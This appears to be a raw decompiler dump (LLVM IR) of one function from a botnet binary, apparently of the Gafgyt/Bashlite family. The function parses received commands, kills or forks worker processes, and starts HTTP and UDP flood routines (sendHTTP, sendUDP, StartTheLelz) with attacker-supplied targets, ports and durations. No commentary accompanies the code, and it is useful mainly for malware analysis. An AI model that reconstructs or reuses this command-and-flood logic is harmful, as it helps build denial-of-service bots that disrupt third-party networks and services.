  %v15_804c270 = icmp eq i8 %v1_804c270, %v3_804c270
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c279 = icmp eq i1 %v15_804c270, false
  br i1 %v1_804c279, label %dec_label_pc_804c295, label %dec_label_pc_804c27b

dec_label_pc_804c27b:                             ; preds = %entry
  %v0_804c27b = load i32, i32* @global_var_805a080.18, align 128
  %v2_804c28b = call i32 @Rootsprintf(i32 %v0_804c27b, i32 ptrtoint ([6 x i8]* @global_var_8056a99.112 to i32))
  br label %dec_label_pc_804cd9b

dec_label_pc_804c295:                             ; preds = %entry
  %v2_804c298 = load i32, i32* %arg2, align 4
  %v4_804c2b5 = inttoptr i32 %v2_804c298 to i8*
  %v7_804c2c7 = call i32 @_strncmp(i8* %v4_804c2b5, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056a9f.113, i32 0, i32 0), i32 6)
  %v8_804c2c7 = urem i32 %v7_804c2c7, 2
  %v9_804c2c7 = icmp eq i32 %v8_804c2c7, 0
  %v0_804c2c9 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c2c9 = or i1 %v0_804c2c9, %v9_804c2c7
  %v3_804c2c9 = zext i1 %v2_804c2c9 to i32
  %v4_804c2c9 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c2c9 = and i32 %v4_804c2c9, -256
  %v6_804c2c9 = or i32 %v3_804c2c9, %v5_804c2c9
  %v7_804c2c9 = xor i32 %v6_804c2c9, 1
  store i32 %v7_804c2c9, i32* %edx.global-to-local, align 4
  %v1_804c2d1 = trunc i32 %v7_804c2c9 to i8
  %v3_804c2d1 = zext i1 %v0_804c2c9 to i8
  %v15_804c2d1 = icmp eq i8 %v1_804c2d1, %v3_804c2d1
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c2da = icmp eq i1 %v15_804c2d1, false
  br i1 %v1_804c2da, label %dec_label_pc_804c413, label %dec_label_pc_804c2e0

dec_label_pc_804c2e0:                             ; preds = %dec_label_pc_804c295
  %v1_804c2e3 = add i32 %tmp119, 4
  %v5_804c2e3 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804c2e3, i1* %cf.global-to-local, align 1
  %v1_804c2e6 = inttoptr i32 %v1_804c2e3 to i32*
  %v2_804c2e6 = load i32, i32* %v1_804c2e6, align 4
  store i1 false, i1* @df, align 1
  %v4_804c303 = inttoptr i32 %v2_804c2e6 to i8*
  store i32 %v2_804c2e6, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056aa5.114 to i32), i32* @edi, align 4
  %v7_804c315 = call i32 @_strncmp(i8* %v4_804c303, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056aa5.114, i32 0, i32 0), i32 4)
  %v8_804c315 = urem i32 %v7_804c315, 2
  %v9_804c315 = icmp eq i32 %v8_804c315, 0
  %v0_804c317 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c317 = or i1 %v0_804c317, %v9_804c315
  %v3_804c317 = zext i1 %v2_804c317 to i32
  %v4_804c317 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c317 = and i32 %v4_804c317, -256
  %v6_804c317 = or i32 %v3_804c317, %v5_804c317
  %v7_804c317 = xor i32 %v6_804c317, 1
  store i32 %v7_804c317, i32* @edx, align 4
  %v1_804c31f = trunc i32 %v7_804c317 to i8
  %v3_804c31f = zext i1 %v0_804c317 to i8
  %v15_804c31f = icmp eq i8 %v1_804c31f, %v3_804c31f
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c328 = icmp eq i1 %v15_804c31f, false
  br i1 %v1_804c328, label %dec_label_pc_804c36b, label %dec_label_pc_804c32a

dec_label_pc_804c32a:                             ; preds = %dec_label_pc_804c2e0
  %v0_804c32a = load i32, i32* @global_var_8060310.115, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c32f = icmp eq i32 %v0_804c32a, 0
  br i1 %v1_804c32f, label %dec_label_pc_804cd9b, label %dec_label_pc_804c337

dec_label_pc_804c337:                             ; preds = %dec_label_pc_804c32a
  %v2_804c347 = call i32 @kill(i32 %v0_804c32a, i32 9)
  %v0_804c34c = load i32, i32* @global_var_805a080.18, align 128
  %v2_804c35c = call i32 @Rootsprintf(i32 %v0_804c34c, i32 ptrtoint ([14 x i8]* @global_var_8056aa9.116 to i32))
  store i32 0, i32* @global_var_8060310.115, align 16
  br label %dec_label_pc_804c36b

dec_label_pc_804c36b:                             ; preds = %dec_label_pc_804c2e0, %dec_label_pc_804c337
  store i1 %v5_804c2e3, i1* %cf.global-to-local, align 1
  %v2_804c371 = load i32, i32* %v1_804c2e6, align 4
  store i1 false, i1* @df, align 1
  %v4_804c38e = inttoptr i32 %v2_804c371 to i8*
  %v7_804c3a0 = call i32 @_strncmp(i8* %v4_804c38e, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056ab7.117, i32 0, i32 0), i32 3)
  %v8_804c3a0 = urem i32 %v7_804c3a0, 2
  %v9_804c3a0 = icmp eq i32 %v8_804c3a0, 0
  %v0_804c3a2 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c3a2 = or i1 %v0_804c3a2, %v9_804c3a0
  %v3_804c3a2 = zext i1 %v2_804c3a2 to i32
  %v4_804c3a2 = load i32, i32* @edx, align 4
  %v5_804c3a2 = and i32 %v4_804c3a2, -256
  %v6_804c3a2 = or i32 %v3_804c3a2, %v5_804c3a2
  %v7_804c3a2 = xor i32 %v6_804c3a2, 1
  store i32 %v7_804c3a2, i32* %edx.global-to-local, align 4
  %v1_804c3aa = trunc i32 %v7_804c3a2 to i8
  %v3_804c3aa = zext i1 %v0_804c3a2 to i8
  %v15_804c3aa = icmp eq i8 %v1_804c3aa, %v3_804c3aa
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c3b3 = icmp eq i1 %v15_804c3aa, false
  br i1 %v1_804c3b3, label %dec_label_pc_804c413, label %dec_label_pc_804c3b5

dec_label_pc_804c3b5:                             ; preds = %dec_label_pc_804c36b
  %v0_804c3b5 = load i32, i32* @global_var_8060310.115, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c3ba = icmp eq i32 %v0_804c3b5, 0
  %v1_804c3bc = icmp eq i1 %v1_804c3ba, false
  br i1 %v1_804c3bc, label %dec_label_pc_804cd9b, label %dec_label_pc_804c3c2

dec_label_pc_804c3c2:                             ; preds = %dec_label_pc_804c3b5
  %v1_804c3c2 = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c3d8 = icmp eq i32 %v1_804c3c2, 0
  br i1 %v4_804c3d8, label %dec_label_pc_804c3f5, label %dec_label_pc_804c3de

dec_label_pc_804c3de:                             ; preds = %dec_label_pc_804c3c2
  store i32 %v1_804c3c2, i32* @global_var_8060310.115, align 16
  br label %dec_label_pc_804cd9b

dec_label_pc_804c3f5:                             ; preds = %dec_label_pc_804c3c2
  store i1 true, i1* %cf.global-to-local, align 1
  %v2_804c402 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_804c40e = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c413:                             ; preds = %dec_label_pc_804c36b, %dec_label_pc_804c295
  %v2_804c416 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804c433 = inttoptr i32 %v2_804c416 to i8*
  store i32 %v2_804c416, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8056aba.118 to i32), i32* @edi, align 4
  %v7_804c445 = call i32 @_strncmp(i8* %v4_804c433, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056aba.118, i32 0, i32 0), i32 5)
  %v8_804c445 = urem i32 %v7_804c445, 2
  %v9_804c445 = icmp eq i32 %v8_804c445, 0
  %v0_804c447 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c447 = or i1 %v0_804c447, %v9_804c445
  %v3_804c447 = zext i1 %v2_804c447 to i32
  %v4_804c447 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c447 = and i32 %v4_804c447, -256
  %v6_804c447 = or i32 %v3_804c447, %v5_804c447
  %v7_804c447 = xor i32 %v6_804c447, 1
  store i32 %v7_804c447, i32* @edx, align 4
  %v1_804c44f = trunc i32 %v7_804c447 to i8
  %v3_804c44f = zext i1 %v0_804c447 to i8
  %v4_804c44f = sub nsw i8 %v1_804c44f, %v3_804c44f
  %v15_804c44f = icmp eq i8 %v4_804c44f, 0
  store i1 false, i1* @cf, align 1
  %v1_804c458 = icmp eq i1 %v15_804c44f, false
  br i1 %v1_804c458, label %dec_label_pc_804c57d, label %dec_label_pc_804c45e

dec_label_pc_804c45e:                             ; preds = %dec_label_pc_804c413
  %v2_804c453 = sext i8 %v4_804c44f to i32
  %v9_804c45e = icmp ult i32 %arg1, 5
  store i1 %v9_804c45e, i1* %cf.global-to-local, align 1
  %v7_804c462 = icmp sgt i32 %arg1, 5
  br i1 %v7_804c462, label %dec_label_pc_804c468, label %dec_label_pc_804cd9b

dec_label_pc_804c468:                             ; preds = %dec_label_pc_804c45e
  %v1_804c46b = add i32 %tmp119, 12
  %v5_804c46b = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804c46b, i1* %cf.global-to-local, align 1
  %v1_804c46e = inttoptr i32 %v1_804c46b to i32*
  %v2_804c46e = load i32, i32* %v1_804c46e, align 4
  %v1_804c473 = call i32 @atol(i32 %v2_804c46e)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp126 = icmp slt i32 %v1_804c473, 1
  br i1 %tmp126, label %dec_label_pc_804cd9b, label %dec_label_pc_804c480

dec_label_pc_804c480:                             ; preds = %dec_label_pc_804c468
  %v1_804c483 = add i32 %tmp119, 20
  %v5_804c483 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804c483, i1* %cf.global-to-local, align 1
  %v1_804c486 = inttoptr i32 %v1_804c483 to i32*
  %v2_804c486 = load i32, i32* %v1_804c486, align 4
  %v1_804c48b = call i32 @atol(i32 %v2_804c486)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp127 = icmp slt i32 %v1_804c48b, 1
  %tmp128 = icmp eq i1 %tmp127, false
  br i1 %tmp128, label %dec_label_pc_804c499, label %dec_label_pc_804cd9b

dec_label_pc_804c499:                             ; preds = %dec_label_pc_804c480
  %v0_804c499 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c49e = icmp eq i32 %v0_804c499, 0
  %v1_804c4a0 = icmp eq i1 %v1_804c49e, false
  br i1 %v1_804c4a0, label %dec_label_pc_804cd9b, label %dec_label_pc_804c4a6

dec_label_pc_804c4a6:                             ; preds = %dec_label_pc_804c499
  store i1 %v5_804c483, i1* %cf.global-to-local, align 1
  %v2_804c4ac = load i32, i32* %v1_804c486, align 4
  %v1_804c4b1 = call i32 @atol(i32 %v2_804c4ac)
  store i32 %v1_804c4b1, i32* @esi, align 4
  store i1 %v5_804c46b, i1* %cf.global-to-local, align 1
  %v2_804c4be = load i32, i32* %v1_804c46e, align 4
  %v1_804c4c3 = call i32 @atol(i32 %v2_804c4be)
  store i32 %v1_804c4c3, i32* %edx.global-to-local, align 4
  %v1_804c4cd = add i32 %tmp119, 8
  %v1_804c4d0 = inttoptr i32 %v1_804c4cd to i32*
  %v1_804c4d5 = add i32 %tmp119, 4
  %v5_804c4d5 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804c4d5, i1* %cf.global-to-local, align 1
  %v1_804c4d8 = inttoptr i32 %v1_804c4d5 to i32*
  %v0_804c4da = load i32, i32* @global_var_805a080.18, align 128
  store i32 %v0_804c4da, i32* @ebx, align 4
  %v2_804c4fb = call i32 @Rootsprintf(i32 %v0_804c4da, i32 ptrtoint ([38 x i8]* @global_var_8056ac0.119 to i32))
  %v1_804c503 = add i32 %tmp119, 24
  %v5_804c503 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c503, i1* %cf.global-to-local, align 1
  %v1_804c506 = inttoptr i32 %v1_804c503 to i32*
  %v2_804c506 = load i32, i32* %v1_804c506, align 4
  %v1_804c50b = call i32 @atol(i32 %v2_804c506)
  store i32 %v1_804c50b, i32* @ebx, align 4
  store i1 %v5_804c483, i1* %cf.global-to-local, align 1
  %v2_804c518 = load i32, i32* %v1_804c486, align 4
  %v1_804c51d = call i32 @atol(i32 %v2_804c518)
  store i32 %v1_804c51d, i32* @esi, align 4
  %v1_804c527 = add i32 %tmp119, 16
  %v1_804c52a = inttoptr i32 %v1_804c527 to i32*
  %v2_804c52a = load i32, i32* %v1_804c52a, align 4
  store i32 %v2_804c52a, i32* @edi, align 4
  store i1 %v5_804c46b, i1* %cf.global-to-local, align 1
  %v2_804c534 = load i32, i32* %v1_804c46e, align 4
  %v1_804c539 = call i32 @atol(i32 %v2_804c534)
  %v1_804c53e = urem i32 %v1_804c539, 65536
  store i32 %v1_804c53e, i32* %edx.global-to-local, align 4
  %v2_804c549 = load i32, i32* %v1_804c4d0, align 4
  store i1 %v5_804c4d5, i1* %cf.global-to-local, align 1
  %v2_804c553 = load i32, i32* %v1_804c4d8, align 4
  %v0_804c555 = load i32, i32* @ebx, align 4
  %v0_804c559 = load i32, i32* @esi, align 4
  %v0_804c55d = load i32, i32* @edi, align 4
  %v6_804c56c = trunc i32 %v1_804c539 to i16
  %v7_804c56c = call i32 @sendHTTP(i32 %v2_804c553, i32 %v2_804c549, i16 %v6_804c56c, i32 %v0_804c55d, i32 %v0_804c559, i32 %v0_804c555)
  store i32 %v7_804c56c, i32* @eax, align 4
  %v1_804c578 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804c57d

dec_label_pc_804c57d:                             ; preds = %dec_label_pc_804c413, %dec_label_pc_804c4a6
  %v2_804c580 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804c59d = inttoptr i32 %v2_804c580 to i8*
  store i32 %v2_804c580, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056ae6.120 to i32), i32* @edi, align 4
  %v7_804c5af = call i32 @_strncmp(i8* %v4_804c59d, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056ae6.120, i32 0, i32 0), i32 4)
  %v8_804c5af = urem i32 %v7_804c5af, 2
  %v9_804c5af = icmp eq i32 %v8_804c5af, 0
  %v0_804c5b1 = load i1, i1* @cf, align 1
  %v2_804c5b1 = or i1 %v0_804c5b1, %v9_804c5af
  %v3_804c5b1 = zext i1 %v2_804c5b1 to i32
  %v4_804c5b1 = load i32, i32* @edx, align 4
  %v5_804c5b1 = and i32 %v4_804c5b1, -256
  %v6_804c5b1 = or i32 %v3_804c5b1, %v5_804c5b1
  %v7_804c5b1 = xor i32 %v6_804c5b1, 1
  store i32 %v7_804c5b1, i32* %edx.global-to-local, align 4
  %v1_804c5b9 = trunc i32 %v7_804c5b1 to i8
  %v3_804c5b9 = zext i1 %v0_804c5b1 to i8
  %v15_804c5b9 = icmp eq i8 %v1_804c5b9, %v3_804c5b9
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c5c2 = icmp eq i1 %v15_804c5b9, false
  br i1 %v1_804c5c2, label %dec_label_pc_804c88a, label %dec_label_pc_804c5c8

dec_label_pc_804c5c8:                             ; preds = %dec_label_pc_804c57d
  %v9_804c5c8 = icmp ult i32 %arg1, 5
  store i1 %v9_804c5c8, i1* %cf.global-to-local, align 1
  %v7_804c5cc = icmp sgt i32 %arg1, 5
  br i1 %v7_804c5cc, label %dec_label_pc_804c5d2, label %dec_label_pc_804c68b

dec_label_pc_804c5d2:                             ; preds = %dec_label_pc_804c5c8
  %v1_804c5d5 = add i32 %tmp119, 12
  %v5_804c5d5 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804c5d5, i1* %cf.global-to-local, align 1
  %v1_804c5d8 = inttoptr i32 %v1_804c5d5 to i32*
  %v2_804c5d8 = load i32, i32* %v1_804c5d8, align 4
  %v1_804c5dd = call i32 @atol(i32 %v2_804c5d8)
  %v5_804c5e2 = icmp ne i32 %v1_804c5dd, -1
  store i1 %v5_804c5e2, i1* %cf.global-to-local, align 1
  %v10_804c5e2 = icmp eq i32 %v1_804c5dd, -1
  br i1 %v10_804c5e2, label %dec_label_pc_804c68b, label %dec_label_pc_804c5eb

dec_label_pc_804c5eb:                             ; preds = %dec_label_pc_804c5d2
  %v1_804c5ee = add i32 %tmp119, 8
  %v5_804c5ee = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804c5ee, i1* %cf.global-to-local, align 1
  %v1_804c5f1 = inttoptr i32 %v1_804c5ee to i32*
  %v2_804c5f1 = load i32, i32* %v1_804c5f1, align 4
  %v1_804c5f6 = call i32 @atol(i32 %v2_804c5f1)
  %v5_804c5fb = icmp ne i32 %v1_804c5f6, -1
  store i1 %v5_804c5fb, i1* %cf.global-to-local, align 1
  %v10_804c5fb = icmp eq i32 %v1_804c5f6, -1
  br i1 %v10_804c5fb, label %dec_label_pc_804c68b, label %dec_label_pc_804c604

dec_label_pc_804c604:                             ; preds = %dec_label_pc_804c5eb
  %v1_804c607 = add i32 %tmp119, 16
  %v2_804c607 = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804c607, i1* %cf.global-to-local, align 1
  %v1_804c60a = inttoptr i32 %v1_804c607 to i32*
  %v2_804c60a = load i32, i32* %v1_804c60a, align 4
  %v1_804c60f = call i32 @atol(i32 %v2_804c60a)
  %v5_804c614 = icmp ne i32 %v1_804c60f, -1
  store i1 %v5_804c614, i1* %cf.global-to-local, align 1
  %v10_804c614 = icmp eq i32 %v1_804c60f, -1
  br i1 %v10_804c614, label %dec_label_pc_804c68b, label %dec_label_pc_804c619

dec_label_pc_804c619:                             ; preds = %dec_label_pc_804c604
  %v1_804c61c = add i32 %tmp119, 20
  %v5_804c61c = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804c61c, i1* %cf.global-to-local, align 1
  %v1_804c61f = inttoptr i32 %v1_804c61c to i32*
  %v2_804c61f = load i32, i32* %v1_804c61f, align 4
  %v1_804c624 = call i32 @atol(i32 %v2_804c61f)
  %v5_804c629 = icmp ne i32 %v1_804c624, -1
  store i1 %v5_804c629, i1* %cf.global-to-local, align 1
  %v10_804c629 = icmp eq i32 %v1_804c624, -1
  br i1 %v10_804c629, label %dec_label_pc_804c68b, label %dec_label_pc_804c62e

dec_label_pc_804c62e:                             ; preds = %dec_label_pc_804c619
  store i1 %v5_804c61c, i1* %cf.global-to-local, align 1
  %v2_804c634 = load i32, i32* %v1_804c61f, align 4
  %v1_804c639 = call i32 @atol(i32 %v2_804c634)
  %v1_804c63e = add i32 %v1_804c639, -65536
  %v2_804c63e = icmp ult i32 %v1_804c639, 65536
  %v3_804c63e = sub i32 65535, %v1_804c639
  %v4_804c63e = and i32 %v3_804c63e, %v1_804c639
  %v5_804c63e = icmp slt i32 %v4_804c63e, 0
  store i1 %v2_804c63e, i1* %cf.global-to-local, align 1
  %v6_804c63e = icmp eq i32 %v1_804c63e, 0
  %v7_804c63e = icmp slt i32 %v1_804c63e, 0
  %v3_804c643 = icmp eq i1 %v7_804c63e, %v5_804c63e
  %v4_804c643 = icmp eq i1 %v6_804c63e, false
  %v5_804c643 = and i1 %v4_804c643, %v3_804c643
  br i1 %v5_804c643, label %dec_label_pc_804c68b, label %dec_label_pc_804c645

dec_label_pc_804c645:                             ; preds = %dec_label_pc_804c62e
  store i1 %v5_804c61c, i1* %cf.global-to-local, align 1
  %v2_804c64b = load i32, i32* %v1_804c61f, align 4
  %v1_804c650 = call i32 @atol(i32 %v2_804c64b)
  %v1_804c655 = add i32 %v1_804c650, -65500
  %v5_804c655 = icmp ult i32 %v1_804c650, 65500
  %v6_804c655 = sub i32 65499, %v1_804c650
  %v7_804c655 = and i32 %v6_804c655, %v1_804c650
  %v8_804c655 = icmp slt i32 %v7_804c655, 0
  store i1 %v5_804c655, i1* %cf.global-to-local, align 1
  %v9_804c655 = icmp eq i32 %v1_804c655, 0
  %v10_804c655 = icmp slt i32 %v1_804c655, 0
  %v3_804c65a = icmp eq i1 %v10_804c655, %v8_804c655
  %v4_804c65a = icmp eq i1 %v9_804c655, false
  %v5_804c65a = and i1 %v4_804c65a, %v3_804c65a
  br i1 %v5_804c65a, label %dec_label_pc_804c68b, label %dec_label_pc_804c65c

dec_label_pc_804c65c:                             ; preds = %dec_label_pc_804c645
  store i1 %v2_804c607, i1* %cf.global-to-local, align 1
  %v2_804c662 = load i32, i32* %v1_804c60a, align 4
  %v1_804c667 = call i32 @atol(i32 %v2_804c662)
  %v1_804c66c = add i32 %v1_804c667, -32
  %v2_804c66c = icmp ult i32 %v1_804c667, 32
  %v3_804c66c = sub i32 31, %v1_804c667
  %v4_804c66c = and i32 %v3_804c66c, %v1_804c667
  %v5_804c66c = icmp slt i32 %v4_804c66c, 0
  store i1 %v2_804c66c, i1* %cf.global-to-local, align 1
  %v6_804c66c = icmp eq i32 %v1_804c66c, 0
  %v7_804c66c = icmp slt i32 %v1_804c66c, 0
  %v3_804c66f = icmp eq i1 %v7_804c66c, %v5_804c66c
  %v4_804c66f = icmp eq i1 %v6_804c66c, false
  %v5_804c66f = and i1 %v4_804c66f, %v3_804c66f
  br i1 %v5_804c66f, label %dec_label_pc_804c68b, label %dec_label_pc_804c671

dec_label_pc_804c671:                             ; preds = %dec_label_pc_804c65c
  %v8_804c671 = icmp ult i32 %arg1, 7
  store i1 %v8_804c671, i1* %cf.global-to-local, align 1
  %v12_804c671 = icmp eq i32 %arg1, 7
  %v1_804c675 = icmp eq i1 %v12_804c671, false
  br i1 %v1_804c675, label %dec_label_pc_804c6a5, label %dec_label_pc_804c677

dec_label_pc_804c677:                             ; preds = %dec_label_pc_804c671
  %v1_804c67a = add i32 %tmp119, 24
  %v5_804c67a = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c67a, i1* %cf.global-to-local, align 1
  %v1_804c67d = inttoptr i32 %v1_804c67a to i32*
  %v2_804c67d = load i32, i32* %v1_804c67d, align 4
  %v1_804c682 = call i32 @atol(i32 %v2_804c67d)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp129 = icmp slt i32 %v1_804c682, 1
  %tmp130 = icmp eq i1 %tmp129, false
  br i1 %tmp130, label %dec_label_pc_804c6a5, label %dec_label_pc_804c68b

dec_label_pc_804c68b:                             ; preds = %dec_label_pc_804c5c8, %dec_label_pc_804c677, %dec_label_pc_804c65c, %dec_label_pc_804c645, %dec_label_pc_804c62e, %dec_label_pc_804c619, %dec_label_pc_804c604, %dec_label_pc_804c5eb, %dec_label_pc_804c5d2
  %v0_804c68b = load i32, i32* @global_var_805a080.18, align 128
  %v2_804c69b = call i32 @Rootsprintf(i32 %v0_804c68b, i32 ptrtoint ([113 x i8]* @global_var_8056aec.121 to i32))
  br label %dec_label_pc_804cd9b

dec_label_pc_804c6a5:                             ; preds = %dec_label_pc_804c677, %dec_label_pc_804c671
  %v1_804c6a8 = add i32 %tmp119, 4
  %v1_804c6ab = inttoptr i32 %v1_804c6a8 to i32*
  %v2_804c6ab = load i32, i32* %v1_804c6ab, align 4
  store i1 %v5_804c5ee, i1* %cf.global-to-local, align 1
  %v2_804c6b6 = load i32, i32* %v1_804c5f1, align 4
  %v1_804c6bb = call i32 @atol(i32 %v2_804c6b6)
  store i1 %v5_804c5d5, i1* %cf.global-to-local, align 1
  %v2_804c6c9 = load i32, i32* %v1_804c5d8, align 4
  %v1_804c6ce = call i32 @atol(i32 %v2_804c6c9)
  store i1 %v2_804c607, i1* %cf.global-to-local, align 1
  %v2_804c6dc = load i32, i32* %v1_804c60a, align 4
  %v1_804c6e1 = call i32 @atol(i32 %v2_804c6dc)
  store i1 %v5_804c61c, i1* %cf.global-to-local, align 1
  %v2_804c6ef = load i32, i32* %v1_804c61f, align 4
  %v1_804c6f4 = call i32 @atol(i32 %v2_804c6ef)
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c700 = icmp sgt i32 %arg1, 6
  br i1 %v7_804c700, label %dec_label_pc_804c724, label %dec_label_pc_804c724.thread

dec_label_pc_804c724.thread:                      ; preds = %dec_label_pc_804c6a5
  store i32 1000, i32* @esi, align 4
  store i1 %v8_804c671, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c755

dec_label_pc_804c724:                             ; preds = %dec_label_pc_804c6a5
  %v1_804c705 = add i32 %tmp119, 24
  %v5_804c705 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c705, i1* %cf.global-to-local, align 1
  %v1_804c708 = inttoptr i32 %v1_804c705 to i32*
  %v2_804c708 = load i32, i32* %v1_804c708, align 4
  %v1_804c70d = call i32 @atol(i32 %v2_804c708)
  store i32 %v1_804c70d, i32* @esi, align 4
  store i1 %v8_804c671, i1* %cf.global-to-local, align 1
  %v7_804c731 = icmp eq i32 %arg1, 7
  br i1 %v7_804c731, label %dec_label_pc_804c755, label %dec_label_pc_804c733

dec_label_pc_804c733:                             ; preds = %dec_label_pc_804c724
  %v1_804c736 = add i32 %tmp119, 28
  %v5_804c736 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804c736, i1* %cf.global-to-local, align 1
  %v1_804c739 = inttoptr i32 %v1_804c736 to i32*
  %v2_804c739 = load i32, i32* %v1_804c739, align 4
  %v1_804c73e = call i32 @atol(i32 %v2_804c739)
  br label %dec_label_pc_804c755

dec_label_pc_804c755:                             ; preds = %dec_label_pc_804c724, %dec_label_pc_804c724.thread, %dec_label_pc_804c733
  %storemerge8137 = phi i32 [ %v1_804c70d, %dec_label_pc_804c733 ], [ %v1_804c70d, %dec_label_pc_804c724 ], [ 1000, %dec_label_pc_804c724.thread ]
  %storemerge7 = phi i32 [ %v1_804c73e, %dec_label_pc_804c733 ], [ 1000000, %dec_label_pc_804c724 ], [ 1000000, %dec_label_pc_804c724.thread ]
  store i32 %storemerge7, i32* @edi, align 4
  %v9_804c75e = icmp ult i32 %arg1, 8
  store i1 %v9_804c75e, i1* %cf.global-to-local, align 1
  %v7_804c762 = icmp sgt i32 %arg1, 8
  br i1 %v7_804c762, label %dec_label_pc_804c764, label %dec_label_pc_804c786

dec_label_pc_804c764:                             ; preds = %dec_label_pc_804c755
  %v1_804c767 = add i32 %tmp119, 32
  %v2_804c767 = icmp ugt i32* %arg2, inttoptr (i32 -33 to i32*)
  store i1 %v2_804c767, i1* %cf.global-to-local, align 1
  %v1_804c76a = inttoptr i32 %v1_804c767 to i32*
  %v2_804c76a = load i32, i32* %v1_804c76a, align 4
  %v1_804c76f = call i32 @atol(i32 %v2_804c76a)
  %phitmp = sext i32 %v1_804c76f to i64
  br label %dec_label_pc_804c786

dec_label_pc_804c786:                             ; preds = %dec_label_pc_804c755, %dec_label_pc_804c764
  %storemerge6 = phi i64 [ %phitmp, %dec_label_pc_804c764 ], [ 0, %dec_label_pc_804c755 ]
  %v2_804c79d = inttoptr i32 %v2_804c6ab to i8*
  %v3_804c79d = call i32 @__GI_strchr(i8* %v2_804c79d, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c7a2 = icmp eq i32 %v3_804c79d, 0
  br i1 %v1_804c7a2, label %dec_label_pc_804c835, label %dec_label_pc_804c7aa

dec_label_pc_804c7aa:                             ; preds = %dec_label_pc_804c786
  store i32 %v2_804c6ab, i32* @eax, align 4
  %v2_804c7b8 = call i32 @__GI_strtok(i32 %v2_804c6ab, i32 ptrtoint (i32* @global_var_8056a71.105 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c82a34 = icmp eq i32 %v2_804c7b8, 0
  %v1_804c82e41 = icmp eq i1 %v4_804c82a34, false
  br i1 %v1_804c82e41, label %dec_label_pc_804c7c2, label %dec_label_pc_804cd9b

dec_label_pc_804c7c2:                             ; preds = %dec_label_pc_804c7aa, %dec_label_pc_804c813
  %storemerge942 = phi i32 [ %v2_804c822, %dec_label_pc_804c813 ], [ %v2_804c7b8, %dec_label_pc_804c7aa ]
  %v0_804c7c2 = call i32 @listFork()
  store i32 %v0_804c7c2, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c7c7 = icmp eq i32 %v0_804c7c2, 0
  %v1_804c7c9 = icmp eq i1 %v1_804c7c7, false
  br i1 %v1_804c7c9, label %dec_label_pc_804c813, label %dec_label_pc_804c7cb

dec_label_pc_804c7cb:                             ; preds = %dec_label_pc_804c7c2
  %v9_804c802 = call i32 @sendUDP(i32 %storemerge942, i32 %v1_804c6bb, i32 %v1_804c6ce, i32 %v1_804c6e1, i32 %v1_804c6f4, i32 %storemerge8137, i32 %storemerge7, i64 %storemerge6)
  %v1_804c80e = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c813:                             ; preds = %dec_label_pc_804c7c2
  %v2_804c822 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8056a71.105 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c82a = icmp eq i32 %v2_804c822, 0
  %v1_804c82e = icmp eq i1 %v4_804c82a, false
  br i1 %v1_804c82e, label %dec_label_pc_804c7c2, label %dec_label_pc_804cd9b

dec_label_pc_804c835:                             ; preds = %dec_label_pc_804c786
  %v0_804c835 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c83a = icmp eq i32 %v0_804c835, 0
  %v1_804c83c = icmp eq i1 %v1_804c83a, false
  br i1 %v1_804c83c, label %dec_label_pc_804cd9b, label %dec_label_pc_804c842

